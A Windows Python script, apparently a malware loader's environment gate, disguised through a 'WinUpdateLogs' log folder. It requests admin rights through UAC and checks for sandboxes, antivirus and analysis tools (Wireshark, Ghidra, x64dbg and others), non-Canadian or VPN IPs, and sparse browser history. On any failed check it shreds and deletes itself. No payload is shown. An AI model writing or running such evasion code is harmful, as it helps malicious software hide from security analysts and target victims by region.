import ctypes, os, sys, subprocess, json, sqlite3, configparser, random, datetime, urllib.request, winreg, logging, traceback, uuid, time

DEBUG_MODE = False
LOG_DIR = os.path.join(os.environ.get('TEMP', os.getcwd()), 'WinUpdateLogs')
os.makedirs(LOG_DIR, exist_ok=True)
LOG_FILE = os.path.join(LOG_DIR, f'edb_{uuid.uuid4().hex[:8]}.log')
hawk = logging.getLogger('hawk')
hawk.setLevel(logging.DEBUG)
fh = logging.FileHandler(LOG_FILE, mode='w', encoding='utf-8')
fh.setLevel(logging.DEBUG)
formatter = logging.Formatter('%(asctime)s|%(levelname)s|%(message)s')
fh.setFormatter(formatter)
hawk.addHandler(fh)
if DEBUG_MODE:
    ch = logging.StreamHandler()
    ch.setLevel(logging.DEBUG)
    ch.setFormatter(formatter)
    hawk.addHandler(ch)

ERR = {
    'RAM_LOW': 101, 'SUSPICIOUS_USERNAME': 102, 'AV_PROCESS_FOUND': 201, 'TOOL_PROCESS_FOUND': 202,
    'AV_SOFTWARE_FOUND': 301, 'TOOL_SOFTWARE_FOUND': 302, 'GEO_FAIL': 401, 'PS_HISTORY_LARGE': 501,
    'PS_RISKY_COMMANDS': 502, 'LOW_BROWSER_APP_CLUSTER': 601, 'ELEVATION_LOOP': 801, 'UNEXPECTED': 999
}

def trigger_exit(code, reason):
    hawk.critical(f"TRIGGER_EXIT|code={code}|reason={reason}")
    for h in hawk.handlers:
        h.flush()
    if not DEBUG_MODE:
        self_del()
    else:
        hawk.info(f"DEBUG: self-deletion suppressed. Log: {LOG_FILE}")
        sys.exit(0)

def self_del():
    p = os.path.abspath(sys.argv[0])
    if not os.path.exists(p): sys.exit(0)
    try:
        sz = os.path.getsize(p)
        with open(p, 'wb') as f:
            f.write(os.urandom(sz))
            f.flush()
            os.fsync(f.fileno())
        os.remove(p)
    except:
        bat = f'{p}.del.bat'
        with open(bat, 'w') as f:
            f.write(f'@echo off\nping 127.0.0.1 -n 2 > nul\ndel /f /q "{p}"\ndel /f /q "{bat}"\n')
        subprocess.Popen(bat, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
    sys.exit(0)

def is_admin():
    try: return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except: return False

def elevate():
    if is_admin(): return
    if os.environ.get('__ELEVATED_ATTEMPT__') == '1':
        hawk.critical("Elevation loop detected")
        trigger_exit(ERR['ELEVATION_LOOP'], "UAC disabled or elevation failed twice")
    os.environ['__ELEVATED_ATTEMPT__'] = '1'
    script = os.path.abspath(sys.argv[0])
    params = ' '.join(f'"{a}"' for a in sys.argv[1:])
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, f'"{script}" {params}', None, 1)
    sys.exit(0)

def chk_ram():
    hawk.info("[RAM_CHECK] start")
    class MEM(ctypes.Structure):
        _fields_ = [("len", ctypes.c_ulong), ("load", ctypes.c_ulong), ("total", ctypes.c_ulonglong),
                    ("avail", ctypes.c_ulonglong), ("pf", ctypes.c_ulonglong), ("pfa", ctypes.c_ulonglong),
                    ("virt", ctypes.c_ulonglong), ("va", ctypes.c_ulonglong), ("ext", ctypes.c_ulonglong)]
    m = MEM()
    m.len = ctypes.sizeof(MEM)
    if not ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(m)):
        hawk.error("[RAM_CHECK] GlobalMemoryStatusEx failed")
        return
    gb = m.total / (1024**3)
    hawk.debug(f"[RAM_CHECK] total={gb:.2f} GB")
    if gb < 2.0:
        hawk.critical(f"[RAM_CHECK] FAIL {gb:.2f} < 2")
        trigger_exit(ERR['RAM_LOW'], f"RAM {gb:.2f} GB")
    hawk.info("[RAM_CHECK] pass")

SANDBOX_EXACT = {'sandbox', 'malware', 'virus', 'cuckoo', 'nms', 'vmware', 'virtual', 'admin-test'}
def chk_user():
    hawk.info("[USER_CHECK] start")
    try: u = os.getlogin().lower()
    except: u = os.environ.get('USERNAME', '').lower()
    hawk.debug(f"[USER_CHECK] username={u}")
    if u in SANDBOX_EXACT:
        trigger_exit(ERR['SUSPICIOUS_USERNAME'], f"Exact sandbox name: {u}")
    score = 0
    if len(u) < 4: score += 30
    if any(word in u for word in ['sandbox', 'malware', 'cuckoo', 'vmware', 'virtual']):
        score += 20
    if score >= 40:
        trigger_exit(ERR['SUSPICIOUS_USERNAME'], f"Username suspicion score {score}")
    hawk.info("[USER_CHECK] pass")

AV_PROCS = {
    'bdagent.exe', 'avastui.exe', 'avgui.exe', 'mbam.exe', 'mbamservice.exe',
    'kav.exe', 'egui.exe', 'fsbts.exe', 'sophos.exe', 'mcshield.exe', 'navw32.exe'
}
TOOL_PROCS = {
    'wireshark.exe', 'procmon.exe', 'procexp.exe', 'ghidra.exe', 'ida.exe', 'x64dbg.exe', 'ollydbg.exe',
    'windbg.exe', 'fiddler.exe', 'charles.exe', 'tcpview.exe', 'regshot.exe', 'autoruns.exe', 'processhacker.exe'
}

def chk_procs():
    hawk.info("[PROC_CHECK] start")
    try:
        out = subprocess.run('tasklist /fo csv /nh', capture_output=True, text=True, shell=True, timeout=15, creationflags=subprocess.CREATE_NO_WINDOW).stdout.lower()
        for line in out.splitlines():
            for p in AV_PROCS:
                if p in line:
                    hawk.critical(f"[PROC_CHECK] AV process: {p}")
                    trigger_exit(ERR['AV_PROCESS_FOUND'], f"Process: {p}")
            for p in TOOL_PROCS:
                if p in line:
                    hawk.critical(f"[PROC_CHECK] Tool process: {p}")
                    trigger_exit(ERR['TOOL_PROCESS_FOUND'], f"Process: {p}")
    except Exception as e:
        hawk.error(f"[PROC_CHECK] error: {e}")
        trigger_exit(ERR['UNEXPECTED'], "Process check failed completely")
    hawk.info("[PROC_CHECK] pass")

AV_BRANDS = {
    'bitdefender':'antivirus', 'malwarebytes':'antimalware', 'norton':'security', 'mcafee':'antivirus',
    'kaspersky':'security', 'avast':'antivirus', 'avg':'antivirus', 'eset':'security', 'trend micro':'security',
    'sophos':'antivirus', 'comodo':'security', 'f-secure':'security', 'g data':'antivirus', 'panda':'antivirus', 'webroot':'antivirus'
}
TOOL_NAMES = {
    'wireshark','procmon','process explorer','ghidra','ida pro','x64dbg','ollydbg','windbg',
    'fiddler','charles','http debugger','api monitor','tcpview','regshot','autoruns','process hacker',
    'dnspy','ilspy','pebear','resource hacker'
}

def chk_software():
    hawk.info("[SW_CHECK] start")
    hives = [(ctypes.windll.advapi32.HKEY_LOCAL_MACHINE, [r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall", r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"]),
             (ctypes.windll.advapi32.HKEY_CURRENT_USER, [r"Software\Microsoft\Windows\CurrentVersion\Uninstall"])]
    total_keys = 0
    for hkey, bases in hives:
        for base in bases:
            try:
                k = winreg.OpenKey(hkey, base)
                i = 0
                while True:
                    try:
                        name = winreg.EnumKey(k, i)
                        total_keys += 1
                        try:
                            with winreg.OpenKey(hkey, f"{base}\\{name}") as sk:
                                d, _ = winreg.QueryValueEx(sk, "DisplayName")
                                d = d.lower()
                                for brand, kw in AV_BRANDS.items():
                                    if brand in d and kw in d:
                                        if 'windows' not in d and 'defender' not in d and 'vpn' not in d:
                                            hawk.critical(f"[SW_CHECK] AV: {d}")
                                            trigger_exit(ERR['AV_SOFTWARE_FOUND'], f"AV: {d}")
                                for t in TOOL_NAMES:
                                    if t in d:
                                        hawk.critical(f"[SW_CHECK] Tool: {d}")
                                        trigger_exit(ERR['TOOL_SOFTWARE_FOUND'], f"Tool: {d}")
                        except: pass
                        i += 1
                    except WindowsError: break
                winreg.CloseKey(k)
            except Exception as e:
                hawk.error(f"[SW_CHECK] reg error: {e}")
    hawk.debug(f"[SW_CHECK] total keys enumerated: {total_keys}")
    if total_keys < 10 and not is_admin():
        hawk.warning("[SW_CHECK] few keys and not admin – uninstall data may be incomplete")
    hawk.info("[SW_CHECK] pass")

def _fetch(url):
    req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'})
    return urllib.request.urlopen(req, timeout=5)

def geo_ca():
    hawk.info("[GEO_CHECK] start")
    try:
        gid = ctypes.windll.kernel32.GetUserGeoID(16)
        hawk.debug(f"[GEO_CHECK] GeoID={gid}")
        if gid == 39:
            hawk.info("[GEO_CHECK] pass via GeoID")
            return True
    except Exception as e:
        hawk.error(f"[GEO_CHECK] GeoID error: {e}")

    apis = [
        ('http://ip-api.com/json/?fields=countryCode,proxy,isp,org,as', lambda d: (d.get('countryCode',''), d.get('proxy',False), ' '.join([d.get('isp',''), d.get('org',''), d.get('as','')]).lower())),
        ('http://ipapi.co/json/', lambda d: (d.get('country',''), d.get('proxy',False), ' '.join([d.get('org','')]).lower()))
    ]
    vpn_words = ['hosting','cloud','datacenter','vpn','proxy','tor','digitalocean','vultr','linode','aws','google cloud','microsoft corporation','ovh','hetzner','leaseweb']
    results = []
    for url, parser in apis:
        try:
            data = json.loads(_fetch(url).read().decode())
            cc, proxy, isp_org = parser(data)
            hawk.debug(f"[GEO_CHECK] API {url}: cc={cc}, proxy={proxy}, isp_org={isp_org}")
            vpn_hit = any(w in isp_org for w in vpn_words)
            results.append((cc, proxy, vpn_hit))
        except Exception as e:
            hawk.error(f"[GEO_CHECK] API {url} error: {e}")

    if results:
        ca_ips = all(r[0]=='CA' for r in results)
        any_proxy = any(r[1] for r in results)
        any_vpn = any(r[2] for r in results)
        hawk.debug(f"[GEO_CHECK] consensus: ca={ca_ips}, proxy={any_proxy}, vpn={any_vpn}")
        if ca_ips and not any_proxy and not any_vpn:
            hawk.info("[GEO_CHECK] pass via IP consensus")
            return True
        elif ca_ips and (any_proxy or any_vpn):
            hawk.critical("[GEO_CHECK] VPN/proxy with CA IP – failing closed")
        else:
            hawk.critical("[GEO_CHECK] not all IPs Canada")
    else:
        hawk.critical("[GEO_CHECK] all IP APIs failed")
    trigger_exit(ERR['GEO_FAIL'], "Not Canada or VPN/proxy detected")
    return False

def get_sys_install_age_days():
    try:
        out = subprocess.run('systeminfo', capture_output=True, text=True, shell=True, timeout=20, creationflags=subprocess.CREATE_NO_WINDOW).stdout
        for line in out.splitlines():
            if 'Original Install Date' in line:
                date_str = line.split(':', 1)[1].strip()
                dt = datetime.datetime.strptime(date_str, "%m/%d/%Y, %I:%M:%S %p")
                return (datetime.datetime.now() - dt).days
    except:
        pass
    return 365

def chk_ps_history():
    hawk.info("[PS_CHECK] start")
    hp = os.path.join(os.environ['APPDATA'], r'Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt')
    if not os.path.exists(hp):
        hawk.info("[PS_CHECK] no history file")
        return
    try:
        with open(hp, 'r', encoding='utf-8', errors='ignore') as f:
            lines = [l.strip() for l in f if l.strip()]
        cnt = len(lines)
        hawk.debug(f"[PS_CHECK] line count={cnt}")
        sys_age = get_sys_install_age_days()
        threshold = 2000 if sys_age > 30 else 800
        if cnt > threshold:
            hawk.critical(f"[PS_CHECK] count {cnt} > {threshold}")
            trigger_exit(ERR['PS_HISTORY_LARGE'], f"Lines: {cnt}")
        if cnt > 30:
            combined = ' '.join(lines).lower()
            risky_high = ['invoke-expression', 'iex ', 'downloadstring', 'frombase64', '-enc ']
            risky_low = ['start-process']
            hits_high = sum(1 for r in risky_high if r in combined)
            hits_low = sum(1 for r in risky_low if r in combined)
            hawk.debug(f"[PS_CHECK] risky high={hits_high}, low={hits_low}")
            if hits_high >= 1 or hits_low >= 5:
                hawk.critical(f"[PS_CHECK] risky commands high={hits_high}, low={hits_low}")
                trigger_exit(ERR['PS_RISKY_COMMANDS'], f"High:{hits_high} Low:{hits_low}")
    except Exception as e:
        hawk.error(f"[PS_CHECK] error: {e}")
    hawk.info("[PS_CHECK] pass")

def browser_history():
    hawk.info("[HISTORY_CHECK] start")
    cnt = 0
    chrome_root = os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data')
    if os.path.isdir(chrome_root):
        for profile in os.listdir(chrome_root):
            db = os.path.join(chrome_root, profile, 'History')
            if os.path.exists(db):
                try:
                    conn = sqlite3.connect(f'file:{db}?mode=ro', uri=True)
                    cur = conn.execute("SELECT COUNT(*) FROM urls")
                    cnt += cur.fetchone()[0]
                    conn.close()
                except:
                    pass
    edge_db = os.path.join(os.environ['LOCALAPPDATA'], r'Microsoft\Edge\User Data\Default\History')
    if os.path.exists(edge_db):
        try:
            conn = sqlite3.connect(f'file:{edge_db}?mode=ro', uri=True)
            cur = conn.execute("SELECT COUNT(*) FROM urls")
            cnt += cur.fetchone()[0]
            conn.close()
        except:
            pass
    ff_ini = os.path.join(os.environ['APPDATA'], r'Mozilla\Firefox\profiles.ini')
    if os.path.exists(ff_ini):
        try:
            cfg = configparser.ConfigParser()
            cfg.read(ff_ini)
            for sec in cfg.sections():
                if 'default' in sec.lower() or cfg.get(sec,'Name',fallback=None)=='Default':
                    pp = cfg.get(sec,'path',fallback=None)
                    if pp:
                        if not os.path.isabs(pp): pp = os.path.join(os.environ['APPDATA'],'Mozilla','Firefox',pp)
                        places = os.path.join(pp,'places.sqlite')
                        if os.path.exists(places):
                            conn = sqlite3.connect(f'file:{places}?mode=ro', uri=True)
                            cur = conn.execute("SELECT COUNT(*) FROM moz_places")
                            cnt += cur.fetchone()[0]
                            conn.close()
        except:
            pass
    hawk.debug(f"[HISTORY_CHECK] total={cnt}")
    hawk.info("[HISTORY_CHECK] end")
    return cnt

def app_cluster():
    hawk.info("[APP_CLUSTER_CHECK] start")
    hives = [(ctypes.windll.advapi32.HKEY_LOCAL_MACHINE, [r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall", r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"]),
             (ctypes.windll.advapi32.HKEY_CURRENT_USER, [r"Software\Microsoft\Windows\CurrentVersion\Uninstall"])]
    from collections import Counter
    day_cnt = Counter()
    now = datetime.datetime.now()
    for hkey, bases in hives:
        for base in bases:
            try:
                k = winreg.OpenKey(hkey, base)
                i = 0
                while True:
                    try:
                        name = winreg.EnumKey(k, i)
                        try:
                            with winreg.OpenKey(hkey, f"{base}\\{name}") as sk:
                                ds, _ = winreg.QueryValueEx(sk, "InstallDate")
                                if ds and len(ds)==8:
                                    dt = datetime.datetime.strptime(ds, "%Y%m%d")
                                    if 0 <= (now - dt).days <= 14:
                                        day_cnt[ds[:8]] += 1
                        except: pass
                        i += 1
                    except WindowsError: break
                winreg.CloseKey(k)
            except Exception as e:
                hawk.error(f"[APP_CLUSTER] reg error: {e}")
    cluster = any(v > 10 for v in day_cnt.values())
    hawk.debug(f"[APP_CLUSTER_CHECK] cluster={cluster}")
    hawk.info("[APP_CLUSTER_CHECK] end")
    return cluster

def main():
    hawk.info(f"[MAIN] start, PID={os.getpid()}, args={sys.argv}")
    if not is_admin():
        hawk.info("[MAIN] elevating")
        elevate()
    chk_ram()
    chk_user()
    chk_procs()
    chk_software()
    geo_ca()
    chk_ps_history()
    hist = browser_history()
    if hist < 20 and app_cluster():
        hawk.critical(f"[MAIN] low history {hist} + app cluster")
        trigger_exit(ERR['LOW_BROWSER_APP_CLUSTER'], f"History={hist}, cluster")
    hawk.info("[MAIN] all checks passed – environment legitimate")
    sys.exit(0)

if __name__ == '__main__':
    main()
